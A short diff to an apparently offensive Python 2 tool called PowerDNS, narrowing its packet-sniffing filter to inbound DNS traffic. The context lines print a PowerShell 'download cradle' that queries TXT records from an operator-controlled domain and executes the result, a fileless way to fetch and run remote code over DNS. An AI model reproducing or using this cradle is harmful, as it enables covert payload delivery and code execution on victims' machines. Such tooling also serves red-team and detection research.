@@ -121,7 +121,7 @@ if __name__ == '__main__':
         print "\033[1;34m[*] PowerDNS:\033[0;0m Use the following download cradle:\n\033[1;34m[*] PowerDNS:\033[0;0m powershell \"powershell (nslookup -q=txt -timeout={} 0.{})[-1]\"".format(timeout, domain)
 
         while True:
-            mSniff = sniff(filter="udp dst port 53", iface=interface, prn=powerdnsHandler)
+            mSniff = sniff(filter="inbound and udp dst port 53", iface=interface, prn=powerdnsHandler)
     except Exception as e:
         print "\033[1;34m[*] PowerDNS:\033[0;0m Error when binding to interface: {}".format(e)
         sys.exit(-1)
